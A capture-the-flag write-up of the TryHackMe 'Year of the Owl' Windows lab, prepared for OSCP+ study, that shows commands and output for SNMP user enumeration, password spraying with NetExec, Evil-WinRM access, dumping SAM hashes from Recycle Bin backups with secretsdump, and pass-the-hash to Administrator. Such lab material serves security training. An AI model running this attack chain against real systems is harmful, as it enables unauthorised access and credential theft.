---
layout: post
title:  THM Year of the Owl Write-up
description: Part of the OSCP+ Preparation Series
date:   2024-11-17 12:00:00 +0300
image:  '/images/thm_year_of_the_owl.png'
tags:   [Write-ups, THM, OSCP+, Hard, Windows, SNMP, OSINT, NetExec, WinRM, SID-Recycle-Bin, Credential-Dumping, SAM-SYSTEM-Dump, Pass-the-Hash]
---

# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [Web Enumeration](#web-enumeration)
  - [SNMP enumeration to find valid username](#snmp-enumeration-to-find-valid-username)
  - [Creating an OSINT password list and using NetExec to find valid credentials](#creating-an-osint-password-list-and-using-netexec-to-find-valid-credentials)
- [Foothold](#foothold)
  - [Access as user Jareth using Evil-WinRM](#access-as-user-jareth-using-evil-winrm)
- [Privilege Escalation](#privilege-escalation)
  - [Finding SAM and SYSTEM files in the Recycle Bin](#finding-sam-and-system-files-in-the-recycle-bin)
  - [Getting the SAM and SYSTEM files and dumping hashes with impacket-secretsdump](#getting-the-sam-and-system-files-and-dumping-hashes-with-impacket-secretsdump)
  - [Pass-the-Hash using Evil-WinRM to get access as Administrator](#pass-the-hash-using-evil-winrm-to-get-access-as-administrator)

# Enumeration
### Nmap
```shell
# Step 1 - Find active ports 10.10.115.133
nmap -p- --min-rate 10000 10.10.115.133

# Step 2 - Focus scan on the active ports found
nmap -A -T4 -Pn -p80,139,443,445,3306,3389,47001 10.10.115.133
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-17 07:07 EST
Nmap scan report for 10.10.115.133
Host is up (0.053s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
|_http-title: Year of the Owl
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
|_ssl-date: TLS randomness does not represent time
|_http-title: Year of the Owl
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   NULL, TerminalServerCookie: 
|_    Host 'ip-10-11-113-193.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: YEAR-OF-THE-OWL
|   NetBIOS_Domain_Name: YEAR-OF-THE-OWL
|   NetBIOS_Computer_Name: YEAR-OF-THE-OWL
|   DNS_Domain_Name: year-of-the-owl
|   DNS_Computer_Name: year-of-the-owl
|   Product_Version: 10.0.17763
|_  System_Time: 2024-11-17T12:08:02+00:00
|_ssl-date: 2024-11-17T12:08:42+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=year-of-the-owl
| Not valid before: 2024-11-16T11:58:08
|_Not valid after:  2025-05-18T11:58:08
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.94SVN%I=7%D=11/17%Time=6739DC95%P=x86_64-pc-linux-gnu%
SF:r(NULL,6A,"f\0\0\x01\xffj\x04Host\x20'ip-10-11-113-193\.eu-west-1\.comp
SF:ute\.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x
SF:20MariaDB\x20server")%r(TerminalServerCookie,6A,"f\0\0\x01\xffj\x04Host
SF:\x20'ip-10-11-113-193\.eu-west-1\.compute\.internal'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-11-17T12:08:02
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.63 seconds
```

Examining the results of the nmap scan, we know that this is a Windows machine.

### Web Enumeration
Lets start with web enumeration first:

```shell
http://10.10.115.133/
```

We can see a picture of an owl but there isnt much else there.

We can also try to enumerate accessible directories and files with feroxbuster:

```shell
feroxbuster -u http://10.10.115.133
```

The feroxbuster results didnt give us anything to work with.

Enumerating all other ports and services wont give us any interesting results.

### SNMP enumeration to find valid username
After exhausting all our possibilities, we still have one last chance enumerating SNMP UDP port and see if we can find anything interesting there:

```shell
sudo nmap -sU -p161 10.10.115.133
```

Hm, lets look at the results...

```shell
<SNIP>
161/udp open|filtered snmp
<SNIP>
```

It seems like maybe we found something here.

Lets use onesixtyone to try to find a community string:

```shell
onesixtyone 10.10.115.133 -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt
```

```shell
Scanning 1 hosts, 3218 communities
10.10.115.133 [openview] Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
```

Examining the results, we found the following string:

```shell
openview
```

Lets now use snmpwalk to enumerate it further. We will use "1.3.6.1.4.1.77.1.2.25" to enumerate the default username list:

```shell
snmpwalk -c openview -v1 10.10.115.133 1.3.6.1.4.1.77.1.2.25
```

```shell
SNMPv2-SMI::enterprises.77.1.2.25.1.1.5.71.117.101.115.116 = STRING: "Guest"
SNMPv2-SMI::enterprises.77.1.2.25.1.1.6.74.97.114.101.116.104 = STRING: "Jareth"
SNMPv2-SMI::enterprises.77.1.2.25.1.1.13.65.100.109.105.110.105.115.116.114.97.116.111.114 = STRING: "Administrator"
SNMPv2-SMI::enterprises.77.1.2.25.1.1.14.68.101.102.97.117.108.116.65.99.99.111.117.110.116 = STRING: "DefaultAccount"
SNMPv2-SMI::enterprises.77.1.2.25.1.1.18.87.68.65.71.85.116.105.108.105.116.121.65.99.99.111.117.110.116 = STRING: "WDAGUtilityAccount"
```

Nice! We found some user account names, being Jareth the only non-default one:

```shell
Guest
Jareth
Administrator
DefaultAccount
WDAGUtilityAccount
```

### Creating an OSINT password list and using NetExec to find valid credentials
Now that we have a valid username, we will create a list with possible passwords for the user Jareth.

We will use his username and password and we will also do some OSINT. If we google the name Jareth, we will find information related to a movie called Labyrinth. We used information about this film to create a possible passwords list called passwords.txt:

```shell
cat passwords.txt
```

```shell
jareth
Jareth
goblin
Goblin
goblinking
GoblinKing
Goblinking
Labyrinth
labyrinth
sarah
Sarah
sarahwilliams
SarahWilliams
hoggle
Hoggle
didymus
Didymus
```

After creating the passwords.txt list, I will use NetExec to check if I can see any valid credential combination:

```shell
nxc smb 10.10.115.133 -u Jareth -p passwords.txt
```

```shell
SMB         10.10.115.133   445    YEAR-OF-THE-OWL  [*] Windows 10 / Server 2019 Build 17763 (name:YEAR-OF-THE-OWL) (domain:year-of-the-owl) (signing:False) (SMBv1:False)
SMB         10.10.115.133   445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:jareth STATUS_LOGON_FAILURE 
SMB         10.10.115.133   445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:Jareth STATUS_LOGON_FAILURE 
SMB         10.10.115.133   445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:goblin STATUS_LOGON_FAILURE 
SMB         10.10.115.133   445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:Goblin STATUS_LOGON_FAILURE 
SMB         10.10.115.133   445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:goblinking STATUS_LOGON_FAILURE 
SMB         10.10.115.133   445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:GoblinKing STATUS_LOGON_FAILURE 
SMB         10.10.115.133   445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:Goblinking STATUS_LOGON_FAILURE 
SMB         10.10.115.133   445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:Labyrinth STATUS_LOGON_FAILURE 
SMB         10.10.115.133   445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:labyrinth STATUS_LOGON_FAILURE 
SMB         10.10.115.133   445    YEAR-OF-THE-OWL  [+] year-of-the-owl\Jareth:sarah
```

We found a valid combination!

```shell
# Username
Jareth

# Password
sarah
```

# Foothold
### Access as user Jareth using Evil-WinRM
We tried getting access using SMB first, but we werent successful:

```shell
impacket-psexec 'Jareth':'sarah'@10.10.115.133
```

```shell
[*] Requesting shares on 10.10.115.133.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
```

But we had better luck trying WinRM access with Evil-WinRM:

```shell
evil-winrm -i 10.10.115.133 -u Jareth -p sarah
```

```shell
*Evil-WinRM* PS C:\Users\Jareth\Documents> whoami
year-of-the-owl\jareth
```

Nice! We are in.

### User Flag
Now we can get the user.txt flag:

```shell
type C:\Users\Jareth\Desktop\user.txt
```

# Privilege Escalation
### Finding SAM and SYSTEM files in the Recycle Bin
Lets start enumerating the user Jareth:

```shell
whoami /all
```

```shell
USER INFORMATION
----------------

User Name              SID
====================== =============================================
year-of-the-owl\jareth S-1-5-21-1987495829-1628902820-919763334-1001


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Examining the results we didnt find any interesting privilege to abuse.

But now that we know the SID of Jareth we can use it to take a look in the Recycle Bin:

```shell
cd 'C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001'
```

```shell
*Evil-WinRM* PS C:\Users\Jareth\Documents> cd 'C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001'
*Evil-WinRM* PS C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> dir


    Directory: C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/18/2020   7:28 PM          49152 sam.bak
-a----        9/18/2020   7:28 PM       17457152 system.bak
```

We found some interesting files there. These seem to be backups of the SAM and SYSTEM registry hives, this means we can try to get them and dump the hashes.

### Getting the SAM and SYSTEM files and dumping hashes with impacket-secretsdump

Lets copy them to the Temp folder and then download them using the Evil-WinRM download function:

```shell
copy sam.bak C:\Windows\Temp\sam.bak
copy system.bak C:\Windows\Temp\system.bak
```

```shell
download C:\Windows\Temp\sam.bak
download C:\Windows\Temp\system.bak
```

Now we can dump the hashes using impacket-secretsdump locally on Kali:

```shell
impacket-secretsdump -sam sam.bak -system system.bak local
```

```shell
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Target system bootKey: 0xd676472afd9cc13ac271e26890b87a8c
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:39a21b273f0cfd3d1541695564b4511b:::
Jareth:1001:aad3b435b51404eeaad3b435b51404ee:5a6103a83d2a94be8fd17161dfd4555a:::
[*] Cleaning up...
```

If the command above doesnt work, we can try adding the -debug parameter to see if we can still get something:

```shell
impacket-secretsdump -debug -sam sam.bak -system system.bak local
```

```shell
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Retrieving class info for JD
[+] Unknown type 0xb'c\x00'
[+] Retrieving class info for Skew1
[+] Unknown type 0xb'4\x00'
[+] Retrieving class info for GBG
[+] Unknown type 0xb'd\x00'
[+] Retrieving class info for Data
[+] Unknown type 0xb'6\x00'
[*] Target system bootKey: 0xd676472afd9cc13ac271e26890b87a8c
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
[+] Calculating HashedBootKey from SAM
[+] NewStyle hashes is: True
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a:::
[+] NewStyle hashes is: True
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] NewStyle hashes is: True
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] NewStyle hashes is: True
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:39a21b273f0cfd3d1541695564b4511b:::
[+] NewStyle hashes is: True
Jareth:1001:aad3b435b51404eeaad3b435b51404ee:5a6103a83d2a94be8fd17161dfd4555a:::
[*] Cleaning up... 
                                                                                                                    
```

Also give this permissions if we are still having problems to dump the hashes:

```shell
sudo chmod 644 sam.bak system.bak
```

An alternative method would be using creddump7:

```shell
pip install creddump7 
python creddump7/pwdump.py sam.bak system.bak
```

### Pass-the-Hash using Evil-WinRM to get access as Administrator

Now we can use Evil-WinRM to pass the hash of the Administrator we got after dumping the SAM and SYSTEM files:

```shell
evil-winrm -i 10.10.115.133 -u Administrator -H 6bc99ede9edcfecf9662fb0c0ddcfa7a
```

### Root Flag
Now we can get the admin.txt flag:

```shell
type C:\Users\Administrator\Desktop\admin.txt
```


